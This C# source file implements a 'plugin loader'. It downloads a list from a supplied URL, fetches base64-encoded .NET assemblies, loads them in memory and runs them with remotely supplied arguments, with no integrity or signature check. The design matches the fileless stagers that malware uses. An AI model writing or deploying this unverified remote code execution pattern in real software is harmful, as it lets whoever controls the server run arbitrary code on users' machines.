using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
/*
       / \      _-'
     _/|  \-''- _ /
__-' { |          \
    /             \
    /       "o.  |o }                Plugin.Core
    |            \ ;              Coded By Antidote
                  ',        Started Project: 29.05.2020
       \_         __\        Last Updates: 04.06.2020
         ''-_    \.//
           / '-____'
          /
        _'
      _-'
*/
namespace Plugin.Core
{
    public static class TypeExtensions
    {
        public static bool ImplementsInterface(this Type type, Type interfaceType) => type.GetInterfaces().Contains(interfaceType);
    }
    public class PluginLoader
    {

        public static IPluginInterface[] GetPlugins(string url) // arguman webten gelcek
        {
            Uri myUri = new Uri(url);
            List<IPluginInterface> plugins = new List<IPluginInterface>();
            string[] arr_plugins = PluginLoader.WebtoPluginList(myUri);
            string hostName = myUri.ToString();
            int pos = hostName.LastIndexOf('/');
            if (pos > 0) { hostName = hostName.Substring(0, pos); }
            foreach (var p_info in arr_plugins)
            {
                string pattern = @"(.*)(##)(.*)"; // 0(1=(/files/plugin1.txt) , 2=(##)  , 3=(args1,args2,args3,args)) Regex Information
                var match = Regex.Match(p_info, pattern);
                string web_path = match.Groups[1].ToString(); // Get webpath
                string[] web_args = Regex.Split(match.Groups[3].ToString(), ","); // Get Args
                byte[] Loadbytes = WebtoByte(hostName + "/"+ web_path); // GetBytes
                Assembly currentAssembly = Assembly.Load(Loadbytes);
                foreach (Type type in currentAssembly.GetTypes())
                {
                    if (!type.ImplementsInterface(typeof(IPluginInterface)))
                    {
                        continue;
                    }
                    IPluginInterface plugin = (IPluginInterface)Activator.CreateInstance(type);
                    plugin.Action(web_args);
                }
            }
            return plugins.ToArray();
        }
        public static string[] WebtoPluginList(Uri url)
        {

            List<string> lines = new List<string>();
            string ret = WebGetRequest(url);
            using (StringReader reader = new StringReader(ret))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    lines.Add(line);
                }
            }
            string[] str = lines.ToArray();
            return str;
        }
        public static byte[]  WebtoByte(string url) 
        {
            Uri myURI = new Uri(url);
            byte[] bytes = Convert.FromBase64String(WebGetRequest(myURI));
            return bytes;
        }
        public static string WebGetRequest(Uri url)
        {
            var request = (HttpWebRequest)WebRequest.Create(url);
            var response = (HttpWebResponse)request.GetResponse();
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
            return responseString;
        }
    }
}
